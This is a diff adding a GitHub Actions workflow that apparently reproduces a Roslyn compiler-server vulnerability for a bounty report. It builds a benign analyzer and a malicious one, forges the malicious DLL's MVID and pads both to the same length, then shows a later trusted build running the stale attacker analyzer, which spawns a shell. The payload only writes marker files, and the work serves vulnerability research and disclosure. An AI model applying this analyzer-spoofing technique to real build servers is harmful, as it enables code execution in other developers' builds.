@@ -1,0 +1,233 @@
+name: roslyn-same-length-mvid-lab
+
+on:
+  push:
+    branches:
+      - dotnet-bounty-lab-20260921
+    paths:
+      - .github/workflows/roslyn-same-length-mvid-lab.yml
+
+permissions:
+  contents: read
+
+jobs:
+  reproduce:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: '10.0.x'
+
+      - name: Prove same MVID plus same byte length still executes stale attacker analyzer
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf /tmp/same-length-fixtures /tmp/same-length-workspace
+          rm -f /tmp/SAME_LENGTH_MARKER /tmp/SAME_LENGTH_CHILD /tmp/same-length.log
+          mkdir -p /tmp/same-length-fixtures/{trusted,malicious,reader}
+
+          cat > /tmp/same-length-fixtures/trusted/CollisionAnalyzer.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <AssemblyName>CollisionAnalyzer</AssemblyName>
+              <Deterministic>true</Deterministic>
+              <DebugType>none</DebugType>
+            </PropertyGroup>
+            <ItemGroup>
+              <Reference Include="Microsoft.CodeAnalysis" HintPath="$(MSBuildSDKsPath)/../Roslyn/bincore/Microsoft.CodeAnalysis.dll" Private="false" />
+            </ItemGroup>
+          </Project>
+          EOF
+          cp /tmp/same-length-fixtures/trusted/CollisionAnalyzer.csproj /tmp/same-length-fixtures/malicious/CollisionAnalyzer.csproj
+
+          cat > /tmp/same-length-fixtures/trusted/CollisionAnalyzer.cs <<'EOF'
+          using System.Collections.Immutable;
+          using Microsoft.CodeAnalysis;
+          using Microsoft.CodeAnalysis.Diagnostics;
+
+          [DiagnosticAnalyzer(LanguageNames.CSharp)]
+          public sealed class CollisionAnalyzer : DiagnosticAnalyzer
+          {
+              // Make the target naturally larger than the malicious assembly before final padding.
+              private const string HarmlessTrustedPadding =
+                  "TRUSTED_PADDING_0000000000000000000000000000000000000000000000000000000000000000" +
+                  "1111111111111111111111111111111111111111111111111111111111111111" +
+                  "2222222222222222222222222222222222222222222222222222222222222222" +
+                  "3333333333333333333333333333333333333333333333333333333333333333";
+
+              private static readonly DiagnosticDescriptor Rule =
+                  new("LAB009", "Lab", HarmlessTrustedPadding, "Lab", DiagnosticSeverity.Warning, true);
+
+              public override ImmutableArray<DiagnosticDescriptor> SupportedDiagnostics => ImmutableArray.Create(Rule);
+
+              public override void Initialize(AnalysisContext context)
+              {
+                  context.EnableConcurrentExecution();
+                  context.RegisterCompilationAction(static ctx =>
+                      ctx.ReportDiagnostic(Diagnostic.Create(Rule, Location.None)));
+              }
+          }
+          EOF
+
+          cat > /tmp/same-length-fixtures/malicious/CollisionAnalyzer.cs <<'EOF'
+          using System.Collections.Immutable;
+          using System.Diagnostics;
+          using System.IO;
+          using Microsoft.CodeAnalysis;
+          using Microsoft.CodeAnalysis.Diagnostics;
+
+          [DiagnosticAnalyzer(LanguageNames.CSharp)]
+          public sealed class CollisionAnalyzer : DiagnosticAnalyzer
+          {
+              private static readonly DiagnosticDescriptor Rule =
+                  new("LAB009", "Lab", "Stale", "Lab", DiagnosticSeverity.Warning, true);
+
+              public override ImmutableArray<DiagnosticDescriptor> SupportedDiagnostics => ImmutableArray.Create(Rule);
+
+              public override void Initialize(AnalysisContext context)
+              {
+                  context.EnableConcurrentExecution();
+                  context.RegisterCompilationAction(static ctx =>
+                  {
+                      File.WriteAllText("/tmp/SAME_LENGTH_MARKER", ctx.Compilation.AssemblyName ?? "<null>");
+                      if (ctx.Compilation.AssemblyName == "Trusted")
+                      {
+                          Process.Start(new ProcessStartInfo
+                          {
+                              FileName = "/bin/sh",
+                              ArgumentList = { "-c", "printf 'SAME_LENGTH_ATTACKER_CHILD\\n' > /tmp/SAME_LENGTH_CHILD" },
+                              UseShellExecute = false
+                          })!.WaitForExit();
+                      }
+                      ctx.ReportDiagnostic(Diagnostic.Create(Rule, Location.None));
+                  });
+              }
+          }
+          EOF
+
+          cat > /tmp/same-length-fixtures/reader/MvidReader.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup><TargetFramework>net10.0</TargetFramework><OutputType>Exe</OutputType></PropertyGroup>
+          </Project>
+          EOF
+          cat > /tmp/same-length-fixtures/reader/Program.cs <<'EOF'
+          using System;
+          using System.IO;
+          using System.Reflection.Metadata;
+          using System.Reflection.PortableExecutable;
+          using var s = File.OpenRead(args[0]);
+          using var pe = new PEReader(s);
+          var md = pe.GetMetadataReader();
+          Console.WriteLine(Convert.ToHexString(md.GetGuid(md.GetModuleDefinition().Mvid).ToByteArray()));
+          EOF
+
+          dotnet build /tmp/same-length-fixtures/trusted/CollisionAnalyzer.csproj -c Release -v:q
+          dotnet build /tmp/same-length-fixtures/malicious/CollisionAnalyzer.csproj -c Release -v:q
+          dotnet build /tmp/same-length-fixtures/reader/MvidReader.csproj -c Release -v:q
+
+          trusted=/tmp/same-length-fixtures/trusted/bin/Release/net10.0/CollisionAnalyzer.dll
+          malicious=/tmp/same-length-fixtures/malicious/bin/Release/net10.0/CollisionAnalyzer.dll
+          reader=/tmp/same-length-fixtures/reader/bin/Release/net10.0/MvidReader.dll
+
+          th=$(dotnet "$reader" "$trusted")
+          mh=$(dotnet "$reader" "$malicious")
+          test "$th" != "$mh"
+
+          python3 - "$trusted" "$malicious" "$mh" "$th" <<'PY'
+          from pathlib import Path
+          import sys
+
+          trusted = Path(sys.argv[1])
+          malicious = Path(sys.argv[2])
+          old = bytes.fromhex(sys.argv[3])
+          new = bytes.fromhex(sys.argv[4])
+
+          m = bytearray(malicious.read_bytes())
+          assert m.count(old) == 1
+          i = m.index(old)
+          m[i:i+16] = new
+          malicious.write_bytes(m)
+
+          # Equalize both files to an attacker-chosen common length using PE trailing padding.
+          # PE/CLR loading ignores trailing bytes; MVIDs and executable semantics are unchanged.
+          t = trusted.read_bytes()
+          m = malicious.read_bytes()
+          target = max(len(t), len(m)) + 4096
+          trusted.write_bytes(t + (b'\x00' * (target - len(t))))
+          malicious.write_bytes(m + (b'\x00' * (target - len(m))))
+          PY
+
+          test "$(dotnet "$reader" "$trusted")" = "$th"
+          test "$(dotnet "$reader" "$malicious")" = "$th"
+
+          trusted_len=$(stat -c '%s' "$trusted")
+          malicious_len=$(stat -c '%s' "$malicious")
+          test "$trusted_len" = "$malicious_len"
+
+          trusted_hash=$(sha256sum "$trusted" | awk '{print $1}')
+          malicious_hash=$(sha256sum "$malicious" | awk '{print $1}')
+          test "$trusted_hash" != "$malicious_hash"
+
+          echo "SAME_LENGTH_TRUSTED_MVID=$th"
+          echo "SAME_LENGTH_ATTACKER_MVID=$(dotnet "$reader" "$malicious")"
+          echo "TRUSTED_FILE_LENGTH=$trusted_len"
+          echo "ATTACKER_FILE_LENGTH=$malicious_len"
+          echo "TRUSTED_SHA256=$trusted_hash"
+          echo "ATTACKER_SHA256=$malicious_hash"
+          echo "SAME_MVID_SAME_LENGTH_DIFFERENT_CONTENT=CONFIRMED"
+
+          dotnet build-server shutdown >/dev/null 2>&1 || true
+          mkdir -p /tmp/same-length-workspace/tools
+          cp "$malicious" /tmp/same-length-workspace/tools/CollisionAnalyzer.dll
+
+          cat > /tmp/same-length-workspace/App.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <OutputType>Exe</OutputType>
+              <AssemblyName>Poison</AssemblyName>
+              <UseSharedCompilation>true</UseSharedCompilation>
+              <RunAnalyzers>false</RunAnalyzers>
+              <RunAnalyzersDuringBuild>false</RunAnalyzersDuringBuild>
+            </PropertyGroup>
+            <ItemGroup><Analyzer Include="$(MSBuildProjectDirectory)/tools/CollisionAnalyzer.dll" /></ItemGroup>
+          </Project>
+          EOF
+          echo 'System.Console.WriteLine("UNTRUSTED");' > /tmp/same-length-workspace/Program.cs
+
+          export RoslynCommandLineLogFile=/tmp/same-length.log
+          dotnet build /tmp/same-length-workspace/App.csproj -c Release -t:Rebuild             -p:UseSharedCompilation=true -p:RunAnalyzers=false -p:RunAnalyzersDuringBuild=false -v:q
+          test ! -e /tmp/SAME_LENGTH_MARKER
+          echo "SAME_LENGTH_POISON_STAGE_EXECUTION=BLOCKED"
+
+          rm -rf /tmp/same-length-workspace
+          mkdir -p /tmp/same-length-workspace/tools
+          cp "$trusted" /tmp/same-length-workspace/tools/CollisionAnalyzer.dll
+          cat > /tmp/same-length-workspace/App.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <OutputType>Exe</OutputType>
+              <AssemblyName>Trusted</AssemblyName>
+              <UseSharedCompilation>true</UseSharedCompilation>
+              <RunAnalyzers>true</RunAnalyzers>
+              <RunAnalyzersDuringBuild>true</RunAnalyzersDuringBuild>
+            </PropertyGroup>
+            <ItemGroup><Analyzer Include="$(MSBuildProjectDirectory)/tools/CollisionAnalyzer.dll" /></ItemGroup>
+          </Project>
+          EOF
+          echo 'System.Console.WriteLine("TRUSTED");' > /tmp/same-length-workspace/Program.cs
+
+          dotnet build /tmp/same-length-workspace/App.csproj -c Release -t:Rebuild -p:UseSharedCompilation=true -v:q
+
+          test -e /tmp/SAME_LENGTH_MARKER
+          test -e /tmp/SAME_LENGTH_CHILD
+          grep -q '^Trusted$' /tmp/SAME_LENGTH_MARKER
+
+          echo "SAME_MVID_SAME_LENGTH_VBCSCOMPILER_BYPASS=CONFIRMED"
+          echo "SAME_MVID_SAME_LENGTH_TRUSTED_CODE_EXECUTION=CONFIRMED"
+          grep -E 'ID=VBCSCompiler .*Begin Analyzer Consistency' /tmp/same-length.log || true
